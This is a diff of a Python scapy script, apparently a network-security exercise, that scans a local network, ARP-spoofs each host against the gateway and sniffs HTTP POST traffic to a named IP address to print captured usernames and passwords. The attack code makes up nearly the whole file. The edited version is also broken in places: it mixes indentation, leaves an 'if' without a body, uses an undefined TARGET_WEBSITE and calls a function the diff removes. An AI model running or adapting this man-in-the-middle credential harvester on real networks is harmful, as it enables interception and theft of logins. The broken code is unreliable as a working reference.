@@ -1,4 +1,5 @@
 import os
+import sys
 import re
 import time
 from scapy.all import *
@@ -55,13 +56,13 @@ def scan_net(ip):
 		vmac.append(line[3])
 		lines = stream.readline()
 	
-	print("IP\t\t\tMAC Address\n-----------------------------------------")
-	for i in range(len(vip)):
-		print(vip[i] + "\t\t" + vmac[i])
+    sys.stdout.write("{:<20}{:<20}\n".format("IP", "MAC Address"))
+    for i in range(len(vip)):
+        sys.stdout.write("{:<20}{:<20}\n".format(vip[i], vmac[i]))
 
 
 	print("\nscan network completed.")
-	print("=======================================================")
+	print("="*20)
 
 	return vip,vmac
 
@@ -77,43 +78,39 @@ def arp():
 	
 	ap_ip, ap_mac = ap(vip,vmac)
 
-	p = []
-	for i in range(len(vip)):
-		p.append(Ether(dst=vip[i], src=attacker_mac)/ARP(pdst=vip[i], psrc=ap_ip, 
-		hwdst=vmac[i], hwsrc=attacker_mac, op=2))		
-	#print(p)
-	
+	# p = []
 	# for i in range(len(vip)):
+	# 	p.append(Ether(dst=vip[i], src=attacker_mac)/ARP(pdst=vip[i], psrc=ap_ip, 
+	# 	hwdst=vmac[i], hwsrc=attacker_mac, op=2))		
+
 
 	for v in range(len(vip)):
 		for i in range(10):
-			#print('send arp ', i)
-			#print(vip[v],vmac[v])
 			sendp(Ether(dst=vmac[v], src=attacker_mac)/ARP(pdst=vip[v], psrc=ap_ip, hwdst=vmac[v], hwsrc=attacker_mac, op=2),verbose=0)
 			sendp(Ether(dst=ap_mac, src=attacker_mac)/ARP(pdst=ap_ip, psrc=vip[v], hwdst=vmac[v], hwsrc=attacker_mac, op=2),verbose=0)
 			time.sleep(0.1)
 
 	print("arp spoffing completed.")
-	print("=======================================================")
-	middle_man(attacker_ip)
+	print("="*20)
+	
 
 # spoof_vic_pkt = Ether(src=attacker_mac,dst=vic_mac)/ARP(psrc=ap_ip, pdst=vic_ip,hwsrc=attacker_mac, op=2)	
 # 		sendp(spoof_vic_pkt)
 # 		spoof_ap_pkt = Ether(src=attacker_mac,dst=ap_mac)/ARP(psrc=vic_ip,pdst=ap_ip,hwsrc=attacker_mac,op=2)
 # 		sendp(spoof_ap_pkt)
 
-def show_http_pkt(packet):
-	if packet.haslayer(HTTPRequest):
-		method = packet[HTTPRequest].Method.decode()
-		if(packet[IP].dst == "140.113.207.246"  and packet.haslayer(Raw) and method == "POST"):
-			raw_data = packet[Raw].load
-			match = re.split(r'&', raw_data.decode())
-			usr_name = re.split(r'=', match[0])[1]
-			usr_pwd = re.split(r'=', match[1])[1]
-			print(usr_name,usr_pwd)
+def http_sniff(packet):
+	s = str(packet[TCP].payload).split('\n')
+	result = re.match(r'^usr\S*', s[-1])
+	if result is not None:
+	up = str(result.group(0)).split('&')
+	print('src_ip', packet[IP].src, 'user: ', up[0].split('=')[1],
+            'password', up[1].split('=')[1])
 
 
-def middle_man(attacker_ip):
+
+
+def middle_man():
 	# s = sniff(count=0, store=1, stop_filter = lambda x: x.haslayer(TCP), lfilter = lambda x: x.haslayer(TCP))
 	# s.show()
 	# dstport = s[0][TCP].sport
@@ -121,8 +118,14 @@ def middle_man(attacker_ip):
 	# result, un = sr(IP(src='140.113.207.246', dst=attacker_ip)/
 	# 	TCP(sport=80, dport=dstport, ack=seqq + 1, seq=300, flags='A'))
 	# result.show()
-	sniff(count=0, prn = show_http_pkt, filter="port 80")
+	sniff(count=0, store=1, prn=http_sniff, lfilter=lambda x: x.haslayer(TCP)
+            and x[IP].dst == TARGET_WEBSITE
+            and x[IP].dport == 80)
+
+def DNS_inter():
+	sniff(count=0, prn = show_http_pkt, filter="port 53")
 
 
 arp()
+middle_man()
 
